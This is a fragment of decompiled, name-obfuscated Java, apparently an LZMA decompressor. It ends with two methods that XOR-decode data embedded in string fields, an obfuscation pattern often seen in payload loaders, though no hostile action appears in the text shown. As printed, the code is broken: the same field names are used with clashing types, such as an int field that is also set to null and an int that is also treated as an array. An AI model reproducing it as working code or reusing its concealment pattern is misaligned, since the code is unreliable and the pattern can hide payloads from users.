                            b2 = this.b((Object)this.e[n10]);
                        }
                        else if (this.a(this.k, 1) == 0) {
                            b2 = 8 + this.b((Object)this.f[n10]);
                        }
                        else {
                            b2 = 8 + (8 + this.b((Object)this.l));
                        }
                        n15 = b2;
                        n15 += 2;
                        n4 = ((n4 < 7) ? 8 : 11);
                    }
                }
                else {
                    n8 = n7;
                    n7 = n6;
                    n6 = n5;
                    int b3;
                    if (this.a(this.i, 0) == 0) {
                        b3 = this.b((Object)this.c[n10]);
                    }
                    else if (this.a(this.i, 1) == 0) {
                        b3 = 8 + this.b((Object)this.d[n10]);
                    }
                    else {
                        b3 = 8 + (8 + this.b((Object)this.j));
                    }
                    n15 = b3;
                    n15 += 2;
                    n4 = ((n4 < 7) ? 7 : 10);
                    final short[][] b4 = this.b;
                    int n17 = n15;
                    n17 -= 2;
                    final int b5;
                    if ((b5 = this.b((Object)b4[(n17 < 4) ? n17 : 3])) >= 4) {
                        final int n18 = (b5 >> 1) - 1;
                        final int n19 = (0x2 | (b5 & 0x1)) << n18;
                        if (b5 < 14) {
                            int n20 = 1;
                            int n21 = 0;
                            for (int n22 = 0; n22 < n18; ++n22) {
                                final int a4 = this.a(this.g, n19 - b5 - 1 + n20);
                                n20 = (n20 << 1) + a4;
                                n21 |= a4 << n22;
                            }
                            n5 = n19 + n21;
                        }
                        else {
                            final int n23 = n19;
                            int n24 = n18 - 4;
                            int n25 = 0;
                            while (n24 != 0) {
                                this.g >>>= 1;
                                final int n26 = this.h - this.g >>> 31;
                                this.h -= (this.g & n26 - 1);
                                n25 = (n25 << 1 | 1 - n26);
                                if ((this.g & 0xFF000000) == 0x0) {
                                    this.h = (this.h << 8 | this.a());
                                    this.g <<= 8;
                                }
                                --n24;
                            }
                            final int n27 = n23 + (n25 << 4);
                            final short[] array2 = this.h;
                            final int n28 = 31 - a(array2.length);
                            int n29 = 1;
                            int n30 = 0;
                            for (int n31 = 0; n31 < n28; ++n31) {
                                final int a5 = this.a(array2, n29);
                                n29 = (n29 << 1) + a5;
                                n30 |= a5 << n31;
                            }
                            if ((n5 = n27 + n30) < 0) {
                                if (n5 != -1) {
                                    return false;
                                }
                                break;
                            }
                        }
                    }
                    else {
                        n5 = b5;
                    }
                }
                if (n5 >= n9 || n5 >= this.p) {
                    return false;
                }
                final int n32 = n5;
                int n33 = n15;
                int n34;
                if ((n34 = this.c - n32 - 1) < 0) {
                    n34 += this.d;
                }
                while (n33 != 0) {
                    if (n34 >= this.d) {
                        n34 = 0;
                    }
                    this.a[this.c++] = this.a[n34++];
                    if (this.c >= this.d) {
                        this.b();
                    }
                    --n33;
                }
                n9 += n15;
                a = this.a(0);
            }
        }
        this.b();
        this.a();
        this.c = null;
        return true;
    }
    
    private static void d(final Object o) {
        final short[] array = (short[])o;
        for (int i = 0; i < array.length; ++i) {
            array[i] = 0;
        }
    }
    
    private static void e(final Object o) {
        final short[][] array = (short[][])o;
        for (int i = 0; i < array.length; ++i) {
            if (array[i] != null) {
                d(array[i]);
            }
        }
    }
    
    private void c() {
        final byte[] array = this.a;
        for (int i = 0; i < array.length; ++i) {
            array[i] = 0;
        }
        this.c = 0;
        this.d = 0;
        this.e = 0;
        this.b = null;
        this.g = 0;
        this.h = 0;
        this.c = null;
        this.j = 0;
        this.k = 0;
        this.l = 0;
        e(this.a);
        d(this.a);
        d(this.b);
        d(this.b);
        d(this.c);
        d(this.d);
        d(this.e);
        d(this.f);
        e(this.b);
        d(this.g);
        d(this.h);
        d(this.i);
        e(this.c);
        e(this.d);
        d(this.j);
        this.m = 0;
        d(this.k);
        e(this.e);
        e(this.f);
        d(this.l);
        this.n = 0;
        this.o = 0;
        this.p = 0;
        this.q = 0;
    }
    
    public static byte[] b(byte[] array) {
        l l = null;
        try {
            final byte[] a = a(array, 5);
            final l i = l = new l();
            final byte[] array2 = a;
            final l j = i;
            boolean b;
            if (array2.length < 5) {
                b = false;
            }
            else {
                final int n2;
                final int n = (n2 = (array2[0] & 0xFF)) % 9;
                final int n4;
                final int n3 = (n4 = n2 / 9) % 5;
                final int n5 = n4 / 5;
                int n6 = 0;
                for (int k = 0; k < 4; ++k) {
                    n6 += (array2[k + 1] & 0xFF) << (k << 3);
                }
                final l m = j;
                final int n7 = n;
                final int n8 = n3;
                final int n9 = n5;
                final int n10 = n8;
                final int n11 = n7;
                final l l2 = m;
                boolean b2;
                if (n11 > 8 || n10 > 4 || n9 > 4) {
                    b2 = false;
                }
                else {
                    final l l3 = l2;
                    final int n12 = n10;
                    final int j2 = n11;
                    final int k2 = n12;
                    final l l4 = l3;
                    if (l3.a == null || l4.j != j2 || l4.k != k2) {
                        l4.k = k2;
                        l4.l = (1 << k2) - 1;
                        l4.j = j2;
                        final int n13 = 1 << l4.j + l4.k;
                        l4.a = new short[n13][];
                        for (int n14 = 0; n14 < n13; ++n14) {
                            l4.a[n14] = new short[768];
                        }
                    }
                    int n15;
                    int m2;
                    for (n15 = 1 << n9, m2 = l2.m; m2 < n15; ++m2) {
                        l2.c[m2] = new short[8];
                        l2.d[m2] = new short[8];
                    }
                    l2.m = m2;
                    int n16;
                    for (n16 = l2.n; n16 < n15; ++n16) {
                        l2.e[n16] = new short[8];
                        l2.f[n16] = new short[8];
                    }
                    l2.n = n16;
                    l2.q = n15 - 1;
                    b2 = true;
                }
                if (!b2) {
                    b = false;
                }
                else {
                    final l l5 = j;
                    final int o = n6;
                    final l l6 = l5;
                    if (o < 0) {
                        b = false;
                    }
                    else {
                        if (l6.o != o) {
                            l6.o = o;
                            final l l7 = l6;
                            l7.p = Math.max(l7.o, 1);
                            final l l8 = l6;
                            final int max = Math.max(l8.p, 4096);
                            final l l9 = l8;
                            if (l8.a == null || l9.d != max) {
                                l9.a = new byte[max];
                            }
                            l9.d = max;
                            l9.c = 0;
                            l9.e = 0;
                        }
                        b = true;
                    }
                }
            }
            if (!b) {
                throw new IllegalArgumentException();
            }
            long n17 = 0L;
            for (int n18 = 0; n18 < 8; ++n18) {
                n17 |= (long)(array[n18 + 5] & 0xFF) << (n18 << 3);
            }
            final byte[] array3 = new byte[(int)n17];
            if (!l.a(array, array3)) {
                l.c();
                return null;
            }
            array = array3;
            l.c();
            return array;
        }
        finally {
            if (l != null) {
                l.c();
            }
        }
    }
    
    private static byte[] a(final long n) {
        final byte[] array;
        (array = new byte[8])[0] = (byte)(n >>> 56);
        array[1] = (byte)(n >>> 48);
        array[2] = (byte)(n >>> 40);
        array[3] = (byte)(n >>> 32);
        array[4] = (byte)(n >>> 24);
        array[5] = (byte)(n >>> 16);
        array[6] = (byte)(n >>> 8);
        array[7] = (byte)n;
        return array;
    }
    
    private static byte[] a(final byte[] array, final int n, int n2) {
        final byte[] array2 = new byte[n2 -= n];
        System.arraycopy((Object)array, n, (Object)array2, 0, Math.min(array.length - n, n2));
        return array2;
    }
    
    public static byte[] a(final byte[] array, final int n) {
        final byte[] array2 = new byte[n];
        System.arraycopy((Object)array, 0, (Object)array2, 0, Math.min(array.length, n));
        return array2;
    }
    
    public static byte[] a() {
        final String b = l.b;
        final StringBuilder sb;
        (sb = new StringBuilder()).append('\\');
        sb.append('b');
        final byte[] a = a(b, sb.toString());
        final byte[] a2 = a(l.b);
        for (int i = 0; i < a.length; ++i) {
            final byte[] array = a;
            final int n = i;
            array[n] ^= a2[i % 8];
        }
        return a;
    }
    
    public static byte[] b() {
        final String a = l.a;
        final StringBuilder sb;
        (sb = new StringBuilder()).append('\\');
        sb.append('c');
        final byte[] a2 = a(a, sb.toString());
        final byte[] a3 = a(l.a);
        for (int i = 0; i < a2.length; ++i) {
            final byte[] array = a2;
            final int n = i;
            array[n] ^= a3[i % 8];
        }
        return a2;
    }
}
